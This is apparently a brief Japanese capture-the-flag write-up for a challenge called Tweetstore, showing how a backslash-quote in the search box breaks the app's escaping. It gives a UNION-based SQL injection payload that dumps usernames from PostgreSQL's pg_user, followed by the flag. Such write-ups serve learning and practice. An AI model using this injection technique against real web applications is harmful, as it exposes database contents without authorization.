# Tweetstore

## Write-up

search word に `\'` を入力するとSQLが `\\'` となり `'` を挿入できる。    
postgresql の pg_user の結果を union すればフラグを取得できる。

```
\' union select usename as url, usename as text, now() as tweeted_at from pg_user --
```

## Flag

`ctf4b{is_postgres_your_friend?}`
